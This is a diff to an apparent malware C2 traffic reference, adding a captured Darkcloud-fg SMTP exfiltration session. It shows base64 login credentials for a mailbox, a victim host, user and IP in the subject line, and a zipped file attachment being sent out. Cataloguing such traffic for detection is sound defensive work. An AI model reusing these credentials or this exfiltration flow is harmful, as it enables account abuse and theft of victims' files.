@@ -769,6 +769,66 @@ Not real TLS traffic, flag on "24 01 00 00" pattern and 24 byte first packet
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/danabot.png "Danabot")
 
+#### Darkcloud-fg
+~~~
+220-sg2plzcpnl456444.prod.sin2.secureserver.net ESMTP Exim 4.95 #2 Mon, 06 Feb 2023 08:00:59 -0700 
+220-We do not authorize the use of this system to transport unsolicited, 
+220 and/or bulk e-mail.
+EHLO DESKTOPJGLLJLD
+250-sg2plzcpnl456444.prod.sin2.secureserver.net Hello DESKTOPJGLLJLD [45.86.200.53]
+250-SIZE 52428800
+250-8BITMIME
+250-PIPELINING
+250-PIPE_CONNECT
+250-AUTH PLAIN LOGIN
+250-STARTTLS
+250 HELP
+AUTH LOGIN
+334 VXNlcm5hbWU6
+aW5mb0BrcmlvbmNvbXB1dGVyLmNvbQ==
+334 UGFzc3dvcmQ6
+cWhyVlNDSyYm
+235 Authentication succeeded
+MAIL FROM: <info@krioncomputer.com>
+250 OK
+RCPT TO: <info@krioncomputer.com>
+250 Accepted
+DATA
+354 Enter message, ending with "." on a line by itself
+thread-index: Adk6O9KSWRF117oSS/+EnKkCJKo7kA==
+Thread-Topic: DC-FG:::DESKTOP-JGLLJLD\admin\45.86.200.110
+From: <info@krioncomputer.com>
+To: <info@krioncomputer.com>
+Subject: DC-FG:::DESKTOP-JGLLJLD\admin\45.86.200.110
+Date: Mon, 6 Feb 2023 15:00:59 -0000
+Message-ID: <4A2332A508DC4B61B8ACDBC8A9CD1E68@DESKTOPJGLLJLD>
+MIME-Version: 1.0
+Content-Type: multipart/mixed;
+	boundary="----=_NextPart_000_0000_01D93A3B.D2A2B3E0"
+X-Mailer: Microsoft CDO for Windows 2000
+Content-Class: urn:content-classes:message
+Importance: normal
+Priority: normal
+X-MimeOLE: Produced By Microsoft MimeOLE
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0000_01D93A3B.D2A2B3E0
+Content-Type: text/plain
+Content-Transfer-Encoding: 7bit
+
+
+------=_NextPart_000_0000_01D93A3B.D2A2B3E0
+Content-Type: application/x-zip-compressed;
+	name="Files.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment;
+	filename="Files.zip"
+
+UEsDBBQAAAAIANaRa090OBjdswQAADkMAAAZAAAARmlsZXMvYXV0aG9yZ2FsbGVyaWVzLnJ0Zq1W
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/darkcloud-fg.png "Darkcloud-fg")
+
 #### Darkcomet
 ~~~
 BF7CAB464EFBA57DAD495BECB15D8B4C57F0BE821AEF052DF1C27F08DDFC328EB3FE9F5699707BCDC8C751A55F2CE98F3201C7FC248AA8FC340C2F20D8436FEDEAF457052D53A8F4BFF6568F5D644E03BDB309B022A095BBC95AECE9ACB25EFD2BA04271017BADF1C0D75325C58BB1A8E3C42814BA1D830DF380472AFFBC7F034344A76764BFCC2DC473B6836F4CF2D8518E9CA4A32A3C5FA402FA2837A9BEE006127A5E073F925EC3F95F680D25EB86F58C423E5C645340002B677EA40FE1648BAE9D11EA4BC915D6E53CEF98429542C22BD7439A33FFE8B48BE44AD038C62AA82985A15A0F7F9E342D9F81EB0DB396D2589D80F51FEE9B296FCCE117FCCC25EB8445EFE7617E0930C3FC1931227EC1E2AC401B18E0AE61924E7402CFBB418711F39C890EB6AAD843903AE1D39A0DF31AFFDECA82F3FA48EB19D122088C809D5CEA3F4C59E8C8D57AB04B3DFDE3DD47B37878AD856643B46CAD5A4DEBC3E677BA446EBAD350549BB36FC8FAAE784C7C1EC91932AEB6A3014F3C11FDB9EBA711B7517E0C4EEFA15FF93BDBE8D0E716D8C7E5F3
